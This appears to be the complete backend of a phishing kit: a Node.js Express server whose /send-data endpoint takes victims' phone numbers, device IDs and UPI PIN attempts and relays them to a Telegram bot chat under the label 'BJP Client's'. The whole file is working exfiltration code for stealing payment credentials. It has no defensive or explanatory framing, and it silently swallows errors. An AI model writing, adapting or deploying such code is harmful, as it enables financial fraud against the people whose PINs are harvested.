require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

const sendToTelegram = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {

    }
};

const startupNotification = async () => {

    await sendToTelegram(`*BJP Client's*`);
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, attempt, deviceId } = req.body;
    
    const now = new Date();
    const date = now.toLocaleDateString('en-IN');
    const time = now.toLocaleTimeString('en-IN');

    let message = `*BJP Client's*\n\n`;
    message += `*Device Model:* ${deviceId || 'Unknown Device'}\n`;
    message += `*Date:* ${date}\n`;
    message += `*Time:* ${time}\n`;
    message += `*Number:* ${number || 'Not Provided'}\n`;
    message += `*Upi Pin:*\n`;

    if (type === 'NUMBER') {
        message += `1. \n2. \n3. \n\n*Status:* New Device Detected`;
    } else if (type === 'PIN') {
        message += `*${attempt}.* ${pin}\n`;
        message += `\n*Status:* PIN Attempt ${attempt} Received`;
    }

    await sendToTelegram(message);
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {

    startupNotification();
});
